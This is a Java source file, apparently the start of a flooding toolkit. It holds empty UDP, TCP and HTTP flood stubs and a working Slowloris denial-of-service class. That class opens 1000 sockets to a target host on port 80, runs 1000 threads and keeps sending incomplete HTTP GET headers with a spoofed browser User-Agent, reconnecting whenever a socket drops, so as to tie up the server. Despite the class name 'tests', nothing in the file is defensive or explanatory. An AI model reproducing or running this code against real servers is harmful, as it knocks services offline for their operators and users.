package com.cool.security;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.UnknownHostException;
import java.util.Random;

import com.cool.util.functions;
import com.cool.util.functions.Device;
public class tests {
	
	public static void UDPFlood() {
		
	}
	
	public static void TCPFlood(String Target) {
		
	}
	
	public static void HTTPFlood() {
		
	}
	
	public static class Slowloris implements Runnable {
		private static String Target;
		private static int Port;
		private static int Dur;
		private static Socket[] Sock = new Socket[1000];
		private static InetAddress addr;
		private static int port;
		private static SocketAddress sockaddr;
		private static Boolean running = false;
		private static BufferedWriter[] out = new BufferedWriter[1000];
		private static String Request;
	public Slowloris(String Target,int Port, int Duration) throws UnknownHostException {
			Dur = Duration;
			addr = InetAddress.getByName(Target);
			port = 80;
			sockaddr = new InetSocketAddress(addr,port);
			System.out.println(Request);
	
	}
	
	public void Start() throws IOException {
		try
		{
		System.out.println(sockaddr.toString());
		for(int i = 0; i < Sock.length; i++) {	
		Sock[i] = new Socket();
		Sock[i].connect(sockaddr);
		out[i] = new BufferedWriter(new OutputStreamWriter(Sock[i].getOutputStream()));
		}
		}
		catch(Exception e)
		{
			System.out.println(e.toString());
		}

	
	
	for(int i = 0; i < 1000; i++) {
		Thread SlowlorisThread = new Thread(this);
		SlowlorisThread.start();
	}
	
	running = true;
	
	}
	@Override
	public void run() {
		
		while (!running) {
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		Random rand = new Random();
		while (running){
			for (int i = 0; i < Sock.length; i++){
				if (Sock[i].isConnected())
				{
					Request="GET /" + rand.nextInt(999999999) + " HTTP/1.1\r\n" +
						    "Host: " + addr.getHostAddress() + "\r\n" +
						    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\r\n" +
						    "Content-Length: 42\r\n";
				try {
					out[i].write(Request);
				} catch (IOException e) {
					Sock[i] = new Socket();
					try {
						Sock[i].connect(sockaddr);
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					try {
						out[i] = new BufferedWriter(new OutputStreamWriter(Sock[i].getOutputStream()));
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					e.printStackTrace();
				}

				try {
					out[i].flush();
					System.out.println(Request);
					System.out.println("Sent Request On Socket " + i);
				} catch (IOException e) {
					Sock[i] = new Socket();
					try {
						Sock[i].connect(sockaddr);
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					try {
						out[i] = new BufferedWriter(new OutputStreamWriter(Sock[i].getOutputStream()));
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					e.printStackTrace();
				}
				
				
				}
				try {
					Thread.sleep(100000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		
	}
	
	}

}
